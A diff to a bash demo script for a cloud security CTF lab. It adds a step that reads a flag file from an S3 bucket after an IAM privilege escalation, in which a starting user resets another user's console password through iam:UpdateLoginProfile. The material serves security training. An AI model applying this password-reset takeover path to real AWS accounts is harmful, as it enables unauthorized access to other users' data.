@@ -236,21 +236,43 @@ echo ""
 echo "  1. Login to AWS Console with the new password"
 echo "  2. Access S3 through the console interface"
 echo "  3. View and download sensitive data from the bucket"
+echo ""
 
+# [EXPLOIT] Step 10: Read the CTF flag from the target bucket
+echo -e "${YELLOW}Step 10: Reading CTF flag from target bucket${NC}"
+echo "The bucket user now controls the target bucket. Reading flag.txt..."
+echo ""
+echo -e "${BLUE}i Note: This scenario uses console-based access.${NC}"
+echo -e "${BLUE}  After logging in as $BUCKET_USER, run the following to capture the flag:${NC}"
+echo ""
+show_attack_cmd "BucketUser" "aws s3 cp s3://$TARGET_BUCKET/flag.txt -"
+echo ""
+echo "(Executing as readonly user to retrieve flag for demo purposes)"
+use_readonly_creds
+FLAG_VALUE=$(aws s3 cp s3://$TARGET_BUCKET/flag.txt - 2>/dev/null)
+if [ -n "$FLAG_VALUE" ]; then
+    echo -e "${GREEN}✓ Flag retrieved successfully!${NC}"
+    echo -e "${GREEN}FLAG: $FLAG_VALUE${NC}"
+else
+    echo -e "${YELLOW}Note: Could not retrieve flag programmatically (expected for console-only scenario)${NC}"
+    FLAG_VALUE="(retrieve via console login as $BUCKET_USER)"
+fi
+echo ""
 
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (with iam:UpdateLoginProfile permission)"
 echo "2. Updated password for: $BUCKET_USER (user with S3 bucket access)"
 echo "3. Achieved: Access to sensitive S3 bucket via console login"
+echo "4. Captured CTF flag: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
-echo "  $STARTING_USER → (UpdateLoginProfile) → $BUCKET_USER → S3 Bucket Access"
+echo "  $STARTING_USER → (UpdateLoginProfile) → $BUCKET_USER → S3 Bucket Access → flag.txt (CTF flag)"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo ""
